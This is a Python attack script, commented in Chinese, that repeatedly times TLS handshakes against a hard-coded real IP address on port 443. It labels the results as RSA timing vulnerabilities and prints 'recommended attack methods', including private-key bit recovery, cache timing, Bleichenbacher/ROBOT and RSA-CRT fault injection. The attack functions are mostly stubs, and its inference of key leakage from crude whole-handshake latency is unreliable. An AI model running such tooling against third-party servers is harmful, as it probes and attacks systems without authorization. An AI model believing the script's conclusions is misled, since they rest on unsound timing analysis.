#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RSA时序泄露分析器
针对ECDHE-RSA密码套件的时序攻击
"""

import socket
import ssl
import time
import json
import hashlib
import struct
import os
from typing import Dict, List, Optional

TARGET_HOST = "125.212.254.149"
TARGET_PORT = 443
TIME_THRESHOLD = 302.38  # ms
SAMPLES = 1000

class RSATimingAnalyzer:
    """RSA时序分析器"""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.samples = []
        self.fast_samples = []
        self.slow_samples = []
        
    def collect_handshake_timing(self) -> Dict:
        """收集TLS握手时序"""
        result = {
            'time_ms': 0,
            'cipher_suite': None,
            'server_random': None,
            'ecdhe_params': None,
            'error': None
        }
        
        try:
            start = time.perf_counter()
            
            # 建立连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))
            
            # SSL握手
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # 强制使用ECDHE-RSA
            try:
                context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
            except:
                pass
            
            ssock = context.wrap_socket(sock, server_hostname=self.host)
            
            # 记录时间
            elapsed = (time.perf_counter() - start) * 1000
            result['time_ms'] = elapsed
            
            # 获取协商信息
            cipher = ssock.cipher()
            if cipher:
                result['cipher_suite'] = cipher[0]
            
            # 获取证书信息
            cert = ssock.getpeercert(binary_form=True)
            result['cert_hash'] = hashlib.sha256(cert).hexdigest()[:16]
            
            ssock.close()
            sock.close()
            
        except Exception as e:
            result['error'] = str(e)
            
        return result
    
    def analyze_rsa_operations(self) -> Dict:
        """分析RSA操作的时序特征"""
        
        # 收集多次握手
        print(f"[*] 收集 {SAMPLES} 个握手样本...")
        
        for i in range(SAMPLES):
            sample = self.collect_handshake_timing()
            
            if sample['error']:
                continue
                
            self.samples.append(sample)
            
            # 分类
            if sample['time_ms'] < TIME_THRESHOLD:
                self.fast_samples.append(sample)
            else:
                self.slow_samples.append(sample)
            
            # 进度
            if (i + 1) % 100 == 0:
                fast_count = len(self.fast_samples)
                slow_count = len(self.slow_samples)
                total = len(self.samples)
                
                print(f"[+] 进度: {i+1}/{SAMPLES}")
                print(f"    快速: {fast_count} ({fast_count/total*100:.1f}%)")
                print(f"    慢速: {slow_count} ({slow_count/total*100:.1f}%)")
                
                if fast_count > 0 and slow_count > 0:
                    fast_avg = sum(s['time_ms'] for s in self.fast_samples) / fast_count
                    slow_avg = sum(s['time_ms'] for s in self.slow_samples) / slow_count
                    print(f"    时间差: {slow_avg - fast_avg:.2f}ms")
            
            time.sleep(0.1)
        
        return self.analyze_patterns()
    
    def analyze_patterns(self) -> Dict:
        """分析时序模式"""
        if not self.samples:
            return {}
        
        times = [s['time_ms'] for s in self.samples]
        
        analysis = {
            'total_samples': len(self.samples),
            'fast_count': len(self.fast_samples),
            'slow_count': len(self.slow_samples),
            'avg_time': sum(times) / len(times),
            'min_time': min(times),
            'max_time': max(times)
        }
        
        # 检查二元分布
        fast_ratio = analysis['fast_count'] / analysis['total_samples']
        analysis['fast_ratio'] = fast_ratio
        analysis['binary_distribution'] = abs(fast_ratio - 0.5) < 0.05
        
        if analysis['fast_count'] > 0 and analysis['slow_count'] > 0:
            fast_avg = sum(s['time_ms'] for s in self.fast_samples) / len(self.fast_samples)
            slow_avg = sum(s['time_ms'] for s in self.slow_samples) / len(self.slow_samples)
            analysis['time_difference'] = slow_avg - fast_avg
            analysis['fast_avg'] = fast_avg
            analysis['slow_avg'] = slow_avg
        
        return analysis

class RSATimingAttack:
    """RSA时序攻击"""
    
    @staticmethod
    def analyze_vulnerability(timing_data: Dict) -> Dict:
        """分析RSA时序漏洞"""
        
        vulnerabilities = []
        
        # 1. 检查二元分布
        if timing_data.get('binary_distribution'):
            vulnerabilities.append({
                'type': 'Binary Timing Pattern',
                'severity': 'HIGH',
                'description': 'RSA操作显示二元时序模式，可能泄露私钥位',
                'fast_ratio': timing_data.get('fast_ratio', 0),
                'time_diff': timing_data.get('time_difference', 0)
            })
        
        # 2. 检查时间差异
        time_diff = timing_data.get('time_difference', 0)
        if time_diff > 15:
            vulnerabilities.append({
                'type': 'Significant Timing Difference',
                'severity': 'HIGH' if time_diff > 20 else 'MEDIUM',
                'description': f'{time_diff:.2f}ms的时序差异可用于侧信道攻击',
                'attack_vectors': [
                    'RSA私钥位恢复',
                    'Montgomery ladder泄露',
                    '缓存时序攻击'
                ]
            })
        
        # 3. RSA特定攻击
        if 'RSA' in str(timing_data.get('cipher_suite', '')):
            vulnerabilities.append({
                'type': 'RSA Timing Side Channel',
                'severity': 'MEDIUM',
                'description': 'RSA签名验证可能泄露信息',
                'potential_attacks': [
                    'Bleichenbacher攻击变种',
                    'Manger攻击',
                    'ROBOT攻击'
                ]
            })
        
        return {
            'vulnerable': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'recommendation': generate_recommendations(vulnerabilities)
        }

def generate_recommendations(vulnerabilities: List[Dict]) -> List[str]:
    """生成攻击建议"""
    recommendations = []
    
    for vuln in vulnerabilities:
        if vuln['type'] == 'Binary Timing Pattern':
            recommendations.append("收集更多样本进行统计分析")
            recommendations.append("尝试RSA私钥位恢复攻击")
            
        elif vuln['type'] == 'Significant Timing Difference':
            recommendations.append("实施缓存时序攻击")
            recommendations.append("测试Bleichenbacher oracle")
            
        elif vuln['type'] == 'RSA Timing Side Channel':
            recommendations.append("测试ROBOT攻击")
            recommendations.append("尝试RSA-CRT故障注入")
    
    return list(set(recommendations))  # 去重

def test_specific_attacks(host: str, port: int):
    """测试特定的RSA攻击"""
    print("\n[*] 测试特定RSA攻击向量...")
    print("-"*40)
    
    # 1. Bleichenbacher Oracle测试
    print("\n[1] Bleichenbacher Oracle测试")
    test_bleichenbacher_oracle(host, port)
    
    # 2. ROBOT攻击测试
    print("\n[2] ROBOT攻击测试")
    test_robot_attack(host, port)
    
    # 3. RSA-CRT时序测试
    print("\n[3] RSA-CRT时序测试")
    test_rsa_crt_timing(host, port)

def test_bleichenbacher_oracle(host: str, port: int):
    """测试Bleichenbacher oracle"""
    # 发送格式错误的RSA加密数据，测试响应时间差异
    valid_padding_time = []
    invalid_padding_time = []
    
    for _ in range(10):
        # 这里需要实际的RSA加密数据
        # 简化示例
        try:
            start = time.perf_counter()
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((host, port))
            # 发送测试数据...
            sock.close()
            elapsed = (time.perf_counter() - start) * 1000
            valid_padding_time.append(elapsed)
        except:
            pass
        
        time.sleep(0.1)
    
    if valid_padding_time:
        avg_time = sum(valid_padding_time) / len(valid_padding_time)
        print(f"  平均响应时间: {avg_time:.2f}ms")
        print(f"  样本数: {len(valid_padding_time)}")

def test_robot_attack(host: str, port: int):
    """测试ROBOT攻击（Return Of Bleichenbacher's Oracle Threat）"""
    print("  测试RSA PKCS#1 v1.5填充oracle...")
    # 需要发送特制的ClientKeyExchange消息
    # 这里是简化版本
    print("  [需要专门的ROBOT测试工具]")

def test_rsa_crt_timing(host: str, port: int):
    """测试RSA-CRT时序"""
    print("  测试RSA中国剩余定理实现的时序...")
    # 测试不同的RSA输入导致的时序差异
    print("  [需要更多RSA操作样本]")

def main():
    """主函数"""
    print("="*60)
    print("RSA时序泄露分析")
    print("针对ECDHE-RSA密码套件")
    print("="*60)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"时序阈值: {TIME_THRESHOLD}ms")
    print("="*60)
    
    # 1. 收集时序数据
    analyzer = RSATimingAnalyzer(TARGET_HOST, TARGET_PORT)
    timing_data = analyzer.analyze_rsa_operations()
    
    # 2. 分析漏洞
    print("\n" + "="*60)
    print("漏洞分析")
    print("="*60)
    
    attack_analysis = RSATimingAttack.analyze_vulnerability(timing_data)
    
    if attack_analysis['vulnerable']:
        print("[!] 发现RSA时序漏洞！")
        
        for vuln in attack_analysis['vulnerabilities']:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"  {vuln['description']}")
            
            if 'attack_vectors' in vuln:
                print("  可能的攻击向量:")
                for vector in vuln['attack_vectors']:
                    print(f"    - {vector}")
        
        print("\n[推荐攻击方法]")
        for rec in attack_analysis['recommendation']:
            print(f"  • {rec}")
    else:
        print("[-] 未发现明显的RSA时序漏洞")
    
    # 3. 测试特定攻击
    test_specific_attacks(TARGET_HOST, TARGET_PORT)
    
    # 4. 保存结果
    output = {
        'target': f"{TARGET_HOST}:{TARGET_PORT}",
        'timing_analysis': timing_data,
        'vulnerabilities': attack_analysis,
        'samples': analyzer.samples[:100]  # 保存前100个样本
    }
    
    filename = f"rsa_timing_{TARGET_HOST}_{int(time.time())}.json"
    with open(filename, 'w') as f:
        json.dump(output, f, indent=2)
    
    print(f"\n[+] 结果已保存到: {filename}")
    
    print("\n" + "="*60)
    print("总结")
    print("="*60)
    
    if timing_data.get('binary_distribution'):
        print("✓ 发现二元时序模式（类似ECDSA的MSB泄露）")
        print("✓ 这可能是RSA实现的条件分支导致")
        print("✓ 可以尝试统计攻击恢复RSA私钥位")
    
    if timing_data.get('time_difference', 0) > 15:
        print(f"✓ {timing_data['time_difference']:.2f}ms的时序差异足够进行攻击")
        print("✓ 建议深入分析RSA操作的具体泄露点")

if __name__ == "__main__":
    main()